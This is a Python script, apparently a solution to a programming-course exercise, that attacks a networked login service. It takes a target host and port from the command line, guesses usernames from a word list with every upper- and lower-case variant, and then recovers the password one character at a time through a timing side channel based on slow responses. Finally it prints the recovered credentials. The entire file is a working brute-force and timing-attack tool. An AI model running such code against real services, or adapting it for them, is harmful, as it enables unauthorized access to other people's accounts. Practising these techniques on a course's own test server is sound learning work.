# write your code here
import sys
import socket
import itertools
import json
import time


# constants
CONNECTION_SUCCESS = "Connection success!"
WRONG_PASSWORD = "Wrong password!"
WRONG_LOGIN = "Wrong login!"
EXCEPTION_LOGIN = "Exception happened during login"


# functions
def password_generator():
    num_and_letters = [chr(x) for x in itertools.chain(range(97, 123), range(48, 58))]

    for i in range(1, 10):
        for p_word in itertools.product(num_and_letters, repeat=i):
            yield ''.join(p_word)


def letter_generator():
    num_n_letter = [chr(x) for x in itertools.chain(range(65, 91), range(97, 123), range(48, 58))]
    for c in num_n_letter:
        yield c


def upper_lower_generator(word):
    for candidate in itertools.product(*zip(word.lower(), word.upper())):
        yield ''.join(candidate)


def get_next_password(path_to_file):
    with open(path_to_file) as the_file:
        for line in the_file:
            up_low_gen = upper_lower_generator(line.strip())
            while True:
                try:
                    yield next(up_low_gen)
                except StopIteration:
                    break


# program runs here
input_arguments = sys.argv
hostname = input_arguments[1]
port = int(input_arguments[2])
address = (hostname, port)
login_password = {"login": "", "password": ""}
password_list = list()


with socket.socket() as s:
    s.connect(address)
    generator = get_next_password('logins.txt')
    response = WRONG_LOGIN
    while response == WRONG_LOGIN:
        try:
            log_in = next(generator)
            login_password["login"] = log_in
            json_login = json.dumps(login_password).encode()
            s.send(json_login)
            json_received = s.recv(1024).decode()
            received = json.loads(json_received)
            response = received["result"]
        except StopIteration:
            break

    letter_gen = letter_generator()
    response = WRONG_PASSWORD
    while response == WRONG_PASSWORD:
        try:
            new_letter = next(letter_gen)
            possible_password = "".join(password_list) + new_letter
            login_password["password"] = possible_password

            start_request = time.time() * 1000

            json_login = json.dumps(login_password).encode()
            s.send(json_login)
            json_received = s.recv(1024).decode()
            received = json.loads(json_received)

            end_request = time.time() * 1000
            request_time = end_request - start_request
            response = received["result"]
            if request_time > 10:
                password_list.append(new_letter)
                letter_gen = letter_generator()  # start generator over again
            if response == CONNECTION_SUCCESS:
                password_list.append(new_letter)
        except StopIteration:
            break


print(json.dumps(login_password, indent=4))
